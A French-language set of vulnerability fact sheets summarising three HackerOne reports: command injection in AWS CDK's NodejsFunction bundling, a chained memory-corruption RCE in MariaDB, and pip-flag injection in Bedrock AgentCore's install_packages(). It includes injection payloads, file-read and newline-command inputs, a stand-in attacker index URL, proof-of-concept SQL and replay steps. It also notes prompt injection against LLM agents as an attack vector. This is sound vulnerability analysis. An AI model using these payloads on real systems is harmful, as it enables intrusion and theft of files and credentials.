# Fiches SSS — Command Injection

*3 cas sélectionnés dans le corpus 2025-2026. Preuves verbatim extraites des fichiers bruts `tools/collector/data/raw/h1/<id>.json` (texte intégral HackerOne).*

---

### Command Injection via Unsanitized Bundling Options in `aws-cdk-lib/aws-lambda-nodejs`

**📄 Cas réel**
sévérité : high · [source](https://hackerone.com/reports/3558713)

Le construct `NodejsFunction` de `aws-cdk-lib/aws-lambda-nodejs` assemble une commande shell à partir de propriétés de bundling contrôlables (`externalModules`, `define`, `loader`, `inject`, `esbuildArgs`) sans échapper les métacaractères, puis l'exécute via `spawnSync('cmd', ['/c', command])` (Windows) ou `spawnSync('bash', ['-c', command])` (Linux/macOS). Un attaquant qui contrôle ces propriétés (construct npm malveillant, PR) exécute des commandes arbitraires sur toute machine lançant `cdk synth`, `cdk deploy` ou `cdk diff`.

**Cause racine :** valeurs concaténées sans échappement dans une commande shell unique passée à un interpréteur (`bash -c` / `cmd /c`) ; le chemin de bundling local est actif par défaut.

**Preuve technique (verbatim depuis la source) :**

```
  ...this.externals.map(external => `--external:${external}`),         // LINE 255 — NO ESCAPING
  ...loaders.map(([ext, name]) => `--loader:${ext}=${name}`),          // LINE 256 — NO ESCAPING
  ...defines.map(([key, value]) => `--define:${key}=${JSON.stringify(value)}`), // LINE 257 — key NOT ESCAPED

exec(
  osPlatform === 'win32' ? 'cmd' : 'bash',
  [
    osPlatform === 'win32' ? '/c' : '-c',
    localCommand,   // <-- the unsanitized command string
  ],

externalModules: ['foo & echo PWNED_VIA_EXTERNAL > pwned_ext.txt'],
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : Node.js v18+ et npm ; un projet CDK avec `aws-cdk-lib` ; côté attaquant, contrôler une valeur passée dans les options de bundling (construct publié sur npm, librairie partagée ou PR).
- Étapes : 1. `mkdir repro-cdk-bundling-rce && npm init -y` puis `npm install aws-cdk-lib constructs esbuild typescript` et `npm install --save-dev aws-cdk ts-node`. 2. Créer `lambda/lambda-handler.ts` puis un `app.ts` définissant un `NodejsFunction` dont `bundling.externalModules` contient `foo & echo PWNED_VIA_EXTERNAL > pwned_ext.txt` (et/ou une clé `define` piégée). 3. Lancer `npx ts-node app.ts` : la commande construite contient `--external:foo & echo PWNED_VIA_EXTERNAL > pwned_ext.txt …` et le shell exécute les commandes injectées. 4. Vérifier `cat pwned_ext.txt` / `cat pwned_def.txt` (ou `type` sous Windows).
- Pièges / limites : la démo s'exécute sous Windows (`npx.cmd`) mais le sink est identique sous Linux/macOS via `bash -c` ; `banner`/`footer` sont partiellement protégés par `JSON.stringify` ; les vecteurs les plus exploitables sont `externalModules` et les clés de `define` ; l'injection est active sans `preCompilation`.

**Reproductibilité :** haute — prérequis triviaux (Node/npm), payloads et commandes complets et déterministes.

**Techniques :** os command injection, shell metacharacter injection, unsanitized string concatenation, malicious npm construct, supply chain, ci/cd build rce

**Correspond aux classes qualifiantes :** rce, supply chain

**Signal (endpoints/fonctions observés) :**
- `NodejsFunction` (`aws-cdk-lib/aws-lambda-nodejs`)
- `createBundlingCommand()` / `bundling.ts` (lignes 245-266, 302)
- `exec()` → `spawnSync('bash', ['-c', …])` / `spawnSync('cmd', ['/c', …])`
- Chemin local de bundling exécuté par `cdk synth` / `cdk deploy` / `cdk diff`

**Paramètres impliqués :** `externalModules`, `define` (clés), `loader` (clés), `inject`, `esbuildArgs`

---

### Low-privilege RCE in MariaDB: SYS_REFCURSOR UAF chained with ST_Area heap over-read

**📄 Cas réel**
sévérité : critical · [source](https://hackerone.com/reports/3856148)

Un utilisateur authentifié à faibles privilèges exécute des commandes OS arbitraires sous l'utilisateur de `mariadbd` via une seule session SQL TCP. Le compte n'a que des privilèges DML/DDL de base, sans FILE, SUPER, admin ni CREATE ROUTINE. Deux bugs mémoire indépendants sont chaînés : un use-after-free du tableau `SYS_REFCURSOR` (le 33ᵉ `OPEN` réalloue le buffer, un curseur ouvert garde un pointeur brut) et un dépassement de lecture tas dans `Gis_multi_polygon::area` (`ST_Area`), en oracle de fuite pour casser ASLR/PIE. Démonstration de bout en bout sur `mariadb:13.0.1-rc`.

**Cause racine :** (1) `sp_cursor_array` stocke les éléments par valeur ; la croissance réalloue le buffer et les curseurs ouverts ne re-seatent jamais leur `select_result*` (déréférencement puis dispatch virtuel dans `FETCH`). (2) `Gis_multi_polygon::area` avance de `WKB_HEADER_SIZE` sans borne ; la différence négative tronquée en `uint32` (~4 Gio) désarme les bornes de l'enfant.

**Preuve technique (verbatim depuis la source) :**

```
BEGIN NOT ATOMIC
  DECLARE c0 SYS_REFCURSOR;  -- ... through c32 ...
  DECLARE c32 SYS_REFCURSOR;
  DECLARE a INT;
  SET @@max_open_cursors = 200;
  OPEN c0 FOR SELECT 1;      -- ... open all 33; the 33rd frees the 32-slot buffer ...
  OPEN c32 FOR SELECT 1;
  FETCH c16 INTO a;          -- dereferences the dangling result
END

SELECT ST_Area(0x0000000001060000000200000001030000000100000003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000);

cd docker-demo && ./start.sh
cd docker-demo && python3 exploit.py
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : compte MariaDB authentifié à faibles privilèges (`SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,CREATE TEMPORARY TABLES,EXECUTE` ; sans FILE/SUPER/admin/CREATE ROUTINE) ; MariaDB 13.0.2 HEAD (commit `84c246ca`) ou image Docker `mariadb:13.0.1-rc` épinglée par digest ; PoC `docker-demo/` (`start.sh`, `exploit.py`) annoncé dans le rapport.
- Étapes : 1. `cd docker-demo && ./start.sh` lance l'image épinglée et provisionne `example-user`/`my_cool_secret` sur `appdb`. 2. Attendre « ready for connections ». 3. `cd docker-demo && python3 exploit.py` : connexion non privilégiée, fuite via `ST_Area`, réallocation du buffer de curseurs, flip de privilège puis exécution ; la sortie `id` s'affiche dans `start.sh`, `execlp` remplace PID 1 et le conteneur se termine (`EXP_CMD` change la commande).
- Pièges / limites : « The exploit may need multiple attempts. In my testing it is roughly a 1/2 reliability. » ; les deux bugs sont nécessaires (en corriger un casse la chaîne) ; sur l'image Docker, `plugin_dir` n'étant pas inscriptible par l'uid `mysql`, la fin de chaîne passe par `execlp` plutôt qu'un UDF ; le code du PoC n'est qu'une archive en pièce jointe.

**Reproductibilité :** basse — chaîne de deux bugs mémoire, version/commit spécifiques, fiabilité ~1/2 et image épinglée.

**Techniques :** memory corruption, use-after-free, out-of-bounds read, aslr/pie bypass, heap leak oracle, virtual dispatch hijack, write-what-where, low-privilege to os command execution

**Correspond aux classes qualifiantes :** rce, privilege escalation, memory corruption

**Signal (endpoints/fonctions observés) :**
- `SYS_REFCURSOR` + `OPEN`/`FETCH` (33e `OPEN` → réallocation du tableau de curseurs)
- `ST_Area` sur un MULTIPOLYGON déclarant plus de polygones que fourni
- `SET @@max_open_cursors = 200`
- `Gis_multi_polygon::area` (`sql/spatial.cc:4089-4091`)

**Paramètres impliqués :** `@@max_open_cursors`, WKB `n_polygons` (MULTIPOLYGON), `@s1`

---

### CodeInterpreter install_packages: command injection via pip flags

**📄 Cas réel**
sévérité : high · [source](https://hackerone.com/reports/3633123)

`install_packages()` du SDK Python Bedrock AgentCore filtre les noms de paquets par blocklist (`;`, `&`, `|`, `` ` ``, `$`) mais ignore la syntaxe pip : `-r /etc/passwd` fait lire un fichier arbitraire du sandbox (contenu fuité dans les erreurs pip), `-r /proc/self/environ` expose les variables d'environnement internes, `--index-url` redirige la résolution vers un PyPI attaquant (DNS interactsh depuis les IP AWS Code Interpreter) et un `\n` injecte une seconde commande. Qui influence les arguments — par exemple par prompt injection contre un agent LLM — obtient lecture de fichiers et exécution dans le sandbox. CVE-2026-12530.

**Cause racine :** blocklist incomplète : elle vérifie les métacaractères shell, mais les chaînes validées sont ensuite concaténées dans `pip install` ; tout flag pip composé de `-`, `/`, `:` et `.` passe, et le retour à la ligne n'est pas filtré.

**Preuve technique (verbatim depuis la source) :**

```
for pkg in packages:
    if any(char in pkg for char in [";", "&", "|", "`", "$"]):
        raise ValueError(f"Invalid characters in package name: {pkg}")

packages_str = " ".join(packages)
upgrade_flag = "--upgrade " if upgrade else ""
command = f"pip install {upgrade_flag}{packages_str}"

code_client.install_packages(["pandas\nid"])
# The 'id' command executes separately after pip install

STEP 2: Bypass blocklist -- read /etc/passwd via -r flag
  ERROR: Invalid requirement: 'root:x:0:0:root:/root:/bin/bash'
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : compte AWS avec accès Bedrock AgentCore (n'importe quel utilisateur authentifié, sans permission spéciale) ; la vulnérabilité existe dans chaque session Code Interpreter ; pouvoir influencer les arguments de `install_packages()` (ex. prompt injection contre un agent LLM).
- Étapes : 1. Lancer le script `demo-pip-injection.py` du rapport. 2. Constater : `pandas; curl http://evil.com` bloqué ; `-r /etc/passwd` contourne et fuit `root:x:0:0:root:/root:/bin/bash` dans l'erreur ; `-r /proc/self/environ` fuit les variables du sandbox. 3. Variantes : `install_packages(["--index-url", "https://attacker.example.com/simple/", "malicious-package"])` (DNS vers l'attaquant) ; `install_packages(["pandas\nid"])` (exécution de `id`).
- Pièges / limites : le script PoC et l'enregistrement terminal sont annoncés en pièces jointes mais absents du JSON brut (aucune pièce jointe enregistrée). Versions affectées : `bedrock-agentcore-sdk-python` jusqu'à au moins v1.4.8. Les variables d'environnement n'exposent des identifiants AWS que sur les sandboxes à rôle IAM.

**Reproductibilité :** moyenne — nécessite un compte AWS AgentCore et une entrée influençable ; les payloads sont complets mais le script PoC n'est pas dans le texte brut.

**Techniques :** argument injection, pip flag injection, blocklist bypass, newline command injection, arbitrary file read via error message, ssrf via index-url, prompt injection

**Correspond aux classes qualifiantes :** rce, local file read, ssrf, prompt injection

**Signal (endpoints/fonctions observés) :**
- `install_packages()` (`src/bedrock_agentcore/tools/code_interpreter_client.py`, lignes 588-598)
- `invoke("executeCommand", {"command": command})`
- `pip install` avec noms de paquets concaténés

**Paramètres impliqués :** `packages`, `--index-url` / `-i`, `-r`, `\n`
